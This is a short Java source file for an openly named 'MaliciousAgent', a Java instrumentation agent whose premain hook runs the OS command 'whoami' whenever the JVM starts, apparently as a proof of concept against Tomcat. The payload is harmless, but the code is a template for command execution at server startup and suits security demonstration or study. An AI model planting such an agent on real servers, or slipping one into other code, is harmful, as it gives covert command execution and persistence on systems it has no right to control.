import java.lang.instrument.Instrumentation;

public class MaliciousAgent {
    public static void premain(String agentArgs, Instrumentation inst) {
        System.out.println("TomcatAgent is running...");
        executeCommand();
    }

    private static void executeCommand() {
        try {
            // 执行指令
            Process process = Runtime.getRuntime().exec("whoami");
            process.waitFor();

            // 读取命令输出
            java.io.BufferedReader reader = new java.io.BufferedReader(new java.io.InputStreamReader(process.getInputStream()));
            String line;
            while ((line = reader.readLine()) != null) {
                System.out.println(line);
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
